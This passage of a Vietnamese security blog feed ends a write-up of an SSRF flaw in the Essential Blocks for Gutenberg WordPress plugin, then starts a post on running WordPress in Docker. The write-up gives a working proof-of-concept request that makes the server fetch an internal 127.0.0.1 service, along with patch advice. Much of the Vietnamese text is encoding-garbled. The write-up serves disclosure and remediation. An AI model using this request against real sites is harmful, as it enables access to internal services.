&amp;#39;image_url&amp;#39; ] ) || isset( $_POST[ &amp;#39;image_b64&amp;#39; ] ) ) &amp;amp;&amp;amp; isset( $_POST[ &amp;#39;prompt&amp;#39; ] ) )&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;local-server&#34;&gt;&lt;span&gt;Local Server&lt;/span&gt;&#xA;  &lt;a href=&#34;#local-server&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;T·∫°o local service ƒë∆°n gi·∫£n b·∫±ng python&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from flask import Flask, jsonify, request, send_from_directory&#xA;import os&#xA;&#xA;BASE_DIR = os.path.abspath(os.getcwd())&#xA;app = Flask(__name__)&#xA;&#xA;@app.route(&amp;#39;/test&amp;#39;)&#xA;def test():&#xA;    return send_from_directory(BASE_DIR, &amp;#39;requirements.txt&amp;#39;, as_attachment=True)&#xA;&#xA;if __name__ == &amp;#39;__main__&amp;#39;:&#xA;    app.run(host=&amp;#39;0.0.0.0&amp;#39;, port=8001, debug=True)&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;hello&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;G·ª≠i request v·ªõi &lt;code&gt;image_url&lt;/code&gt; tr·ªè ƒë·∫øn local service &lt;code&gt;http://127.0.0.1:8001/test&lt;/code&gt; b·∫±ng user &lt;strong&gt;Author&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0&#xA;Accept: text/html,application/xhtml&amp;#43;xml,application/xml;q=0.9,*/*;q=0.8&#xA;Accept-Language: en-US,en;q=0.5&#xA;Accept-Encoding: gzip, deflate, br&#xA;Referer: http://localhost/wp-login.php?loggedout=true&amp;amp;wp_lang=en_US&#xA;Connection: keep-alive&#xA;Cookie: wordpress_86a9106ae65537651a8e456835b316ab=auth%7C1761189920%7CaUULiwmj9KXCapzU3Q82L7W45WcbXbqHowa8a6yQ2Vz%7C3cc12be38f8f94048309b7fcd31bd2187065311afecea7df5a9f01f5a207072b; wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=auth%7C1761189920%7CaUULiwmj9KXCapzU3Q82L7W45WcbXbqHowa8a6yQ2Vz%7C38f09626eae6d08f6cdb9cd1ce781da26c2acdd8ef2fd1822d84a6d76c6c95ad; wp-settings-time-4=1761017121&#xA;&#xA;action=save_ai_generated_image&amp;amp;admin_nonce=9433571df4&amp;amp;prompt=abc&amp;amp;image_url=http://127.0.0.1:8001/test&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Response&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;success&amp;#34;: true,&#xA;  &amp;#34;data&amp;#34;: {&#xA;    &amp;#34;attachment_id&amp;#34;: 355,&#xA;    &amp;#34;url&amp;#34;: &amp;#34;http://localhost/wp-content/uploads/2025/10/ai-generated-abc-1761019403.png&amp;#34;,&#xA;    &amp;#34;alt&amp;#34;: &amp;#34;abc&amp;#34;,&#xA;    &amp;#34;title&amp;#34;: &amp;#34;abc&amp;#34;,&#xA;    &amp;#34;caption&amp;#34;: &amp;#34;&amp;#34;,&#xA;    &amp;#34;description&amp;#34;: &amp;#34;&amp;#34;&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;ƒê·ªçc file ƒë∆∞·ª£c l∆∞u &lt;code&gt;http://localhost/wp-content/uploads/2025/10/ai-generated-abc-1761019403.png&lt;/code&gt; b·∫±ng &lt;strong&gt;BurpSuite&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-22-cve-2025-11361/result.png&#34; title=&#34;N·ªôi dung ƒë·ªçc ƒë∆∞·ª£c t·ª´ local service&#34; data-thumbnail=&#34;/posts/2025-10-22-cve-2025-11361/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;N·ªôi dung ƒë·ªçc ƒë∆∞·ª£c t·ª´ local service&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-22-cve-2025-11361/result.png&#39; alt=&#34;Result&#34; height=&#34;383&#34; width=&#34;1155&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;N·ªôi dung ƒë·ªçc ƒë∆∞·ª£c t·ª´ local service&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition information open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Information&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Kh√¥ng th·ªÉ ƒë·ªçc n·ªôi dung tr√™n ·ªü tr√¨nh duy·ªát, v√¨ n·ªôi dung trong &lt;code&gt;ai-generated-abc-1761019403.png&lt;/code&gt; (&lt;code&gt;&#39;hello&#39;&lt;/code&gt;) kh√¥ng ph√π h·ª£p v·ªõi &lt;strong&gt;Content-Type: image/png&lt;/strong&gt; tr·∫£ v·ªÅ, n√™n tr√¨nh duy·ªát render ra l·ªói.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Phi√™n b·∫£n &lt;strong&gt;‚â§ 5.7.1&lt;/strong&gt; c·ªßa &lt;strong&gt;Essential Blocks for Gutenberg&lt;/strong&gt; m·∫Øc l·ªói &lt;strong&gt;SSRF&lt;/strong&gt; do d√πng &lt;code&gt;wp_remote_get()&lt;/code&gt; t·∫£i URL kh√¥ng ki·ªÉm so√°t, cho ph√©p user &lt;strong&gt;Author&lt;/strong&gt; g·ª≠i request ƒë·∫øn ƒë·ªãa ch·ªâ n·ªôi b·ªô. B·∫£n v√° &lt;strong&gt;5.7.2&lt;/strong&gt; thay b·∫±ng &lt;code&gt;wp_safe_remote_get()&lt;/code&gt;, th√™m ki·ªÉm tra m√£ ph·∫£n h·ªìi, MIME h·ª£p l·ªá v√† x√°c th·ª±c n·ªôi dung h√¨nh ·∫£nh, gi√∫p ngƒÉn ch·∫∑n SSRF.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;C·∫≠p nh·∫≠t ngay l√™n &lt;strong&gt;v5.7.2&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;D√πng &lt;code&gt;wp_safe_remote_get()&lt;/code&gt; thay cho &lt;code&gt;wp_remote_get()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Lu√¥n x√°c th·ª±c ph·∫£n h·ªìi (HTTP code, MIME, n·ªôi dung).&lt;/li&gt;&#xA;&lt;li&gt;Gi·ªõi h·∫°n timeout, redirect v√† k√≠ch th∆∞·ªõc file.&lt;/li&gt;&#xA;&lt;li&gt;Ki·ªÉm tra d·ªØ li·ªáu ƒë·∫ßu v√†o v√† quy·ªÅn user c·∫©n th·∫≠n.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SSRF (Server Side Request Forgery) ‚Äî Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/essential-blocks/vulnerability/wordpress-essential-blocks-plugin-5-7-1-authenticated-author-server-side-request-forgery-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Essential Blocks for Gutenberg Plugin &amp;lt;= 5.7.1 is vulnerable to Server Side Request Forgery (SSRF) &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>WordPress Local and Debugging in Docker</title>
      <link>http://localhost:1313/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/</link>
      <pubDate>Wed, 22 Oct 2025 15:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/</guid>
      <category domain="http://localhost:1313/vi/categories/web/">Web</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-22-wordpress-local-and-debugging-docker/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;&lt;strong&gt;Ti·∫øp n·ªëi&lt;/strong&gt; ph·∫ßn h∆∞·ªõng d·∫´n &lt;strong&gt;c√†i ƒë·∫∑t WordPress tr√™n m√¥i tr∆∞·ªùng local&lt;/strong&gt; ·ªü &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;b√†i vi·∫øt tr∆∞·ªõc&lt;/a&gt;, b√†i n√†y s·∫Ω h∆∞·ªõng d·∫´n b·∫°n &lt;strong&gt;thi·∫øt l·∫≠p WordPress b·∫±ng Docker&lt;/strong&gt; ‚Äî m·ªôt c√°ch hi·ªán ƒë·∫°i, linh ho·∫°t v√† d·ªÖ chia s·∫ª h∆°n.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;why-use-docker&#34;&gt;&lt;span&gt;Why Use Docker?&lt;/span&gt;&#xA;  &lt;a href=&#34;#why-use-docker&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Docker cho ph√©p b·∫°n ƒë√≥ng g√≥i to√†n b·ªô m√¥i tr∆∞·ªùng ch·∫°y WordPress (PHP, MySQL, web server v√† m√£ ngu·ªìn) v√†o c√°c container ƒë·ªôc l·∫≠p. C√°ch l√†m n√†y mang l·∫°i nhi·ªÅu l·ª£i √≠ch:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;ƒê·ªìng nh·∫•t m√¥i tr∆∞·ªùng&lt;/strong&gt;: Ch·∫°y gi·ªëng nhau tr√™n m·ªçi m√°y, tr√°nh l·ªói ‚Äúch·∫°y ƒë∆∞·ª£c tr√™n m√°y t√¥i‚Äù.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;D·ªÖ c√†i ƒë·∫∑t v√† t√°i t·∫°o&lt;/strong&gt;: Ch·ªâ c·∫ßn v√†i l·ªánh ƒë·ªÉ kh·ªüi t·∫°o ho·∫∑c reset to√†n b·ªô h·ªá th·ªëng.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;C√°ch ly v√† an to√†n&lt;/strong&gt;: M·ªói container l√† m·ªôt m√¥i tr∆∞·ªùng ri√™ng, tr√°nh xung ƒë·ªôt ph·∫ßn m·ªÅm.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Thu·∫≠n ti·ªán cho ph√°t tri·ªÉn v√† debug&lt;/strong&gt;: C√≥ th·ªÉ b·∫≠t Xdebug, theo d√µi log, ho·∫∑c ch·ªânh PHP m√† kh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn h·ªá th·ªëng ch√≠nh.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;D·ªÖ chia s·∫ª&lt;/strong&gt;: Ch·ªâ c·∫ßn g·ª≠i file &lt;code&gt;docker-compose.yml&lt;/code&gt; v√† c√°c file c·∫•u h√¨nh, ng∆∞·ªùi kh√°c c√≥ th·ªÉ kh·ªüi ch·∫°y c√πng m√¥i tr∆∞·ªùng gi·ªëng b·∫°n ‚Äî kh√¥ng c·∫ßn c√†i ƒë·∫∑t th·ªß c√¥ng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Docker l√† &lt;strong&gt;gi·∫£i ph√°p t·ªëi ∆∞u&lt;/strong&gt; ƒë·ªÉ ph√°t tri·ªÉn, th·ª≠ nghi·ªám v√† c·ªông t√°c tr√™n c√°c d·ª± √°n WordPress, ƒë·∫∑c bi·ªát h·ªØu √≠ch cho l·∫≠p tr√¨nh vi√™n, nh√≥m l√†m vi·ªác ho·∫∑c ng∆∞·ªùi l√†m pentest mu·ªën c√≥ m√¥i tr∆∞·ªùng nh·∫•t qu√°n, d·ªÖ t√°i s·ª≠ d·ª•ng.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;setup-wordpress-for-hacker-in-docker&#34;&gt;&lt;span&gt;Setup WordPress for Hacker in Docker&lt;/span&gt;&#xA;  &lt;a href=&#34;#setup-wordpress-for-hacker-in-docker&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;prerequisites&#34;&gt;&lt;span&gt;Prerequisites&lt;/span&gt;&#xA;  &lt;a href=&#34;#prerequisites&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;docker&#34;&gt;&lt;span&gt;Docker&lt;/span&gt;&#xA;  &lt;a href=&#34;#docker&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Tr∆∞·ªõc ti√™n, b·∫°n c·∫ßn c√†i ƒë·∫∑t &lt;strong&gt;Docker&lt;/strong&gt;. C√¥ng c·ª• n√†y h·ªó tr·ª£ tr√™n nhi·ªÅu h·ªá ƒëi·ªÅu h√†nh, m·ªói n·ªÅn t·∫£ng c√≥ c√°ch c√†i ƒë·∫∑t ri√™ng.&lt;br&gt;&#xA;Xem h∆∞·ªõng d·∫´n t·∫°i: &lt;a href=&#34;https://www.docker.com/get-started/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://www.docker.com/get-started/&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;docker-compose&#34;&gt;&lt;span&gt;Docker Compose&lt;/span&gt;&#xA;  &lt;a href=&#34;#docker-compose&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Thay v√¨ ch·∫°y t·ª´ng container th·ªß c√¥ng b·∫±ng &lt;code&gt;docker run&lt;/code&gt;, ta d√πng &lt;strong&gt;Docker Compose&lt;/strong&gt; ƒë·ªÉ ƒë·ªãnh nghƒ©a v√† qu·∫£n l√Ω nhi·ªÅu container li√™n k·∫øt ch·ªâ b·∫±ng &lt;strong&gt;m·ªôt file c·∫•u h√¨nh duy nh·∫•t&lt;/strong&gt; (&lt;code&gt;docker-compose.yml&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;p&gt;V·ªõi WordPress, ta c·∫ßn:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;M·ªôt container &lt;strong&gt;MySQL&lt;/strong&gt; ƒë·ªÉ l∆∞u c∆° s·ªü d·ªØ li·ªáu.&lt;/li&gt;&#xA;&lt;li&gt;M·ªôt container &lt;strong&gt;WordPress (PHP + web server)&lt;/strong&gt; ƒë·ªÉ ch·∫°y m√£ ngu·ªìn.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;N·∫øu l√†m th·ªß c√¥ng, b·∫°n s·∫Ω ph·∫£i 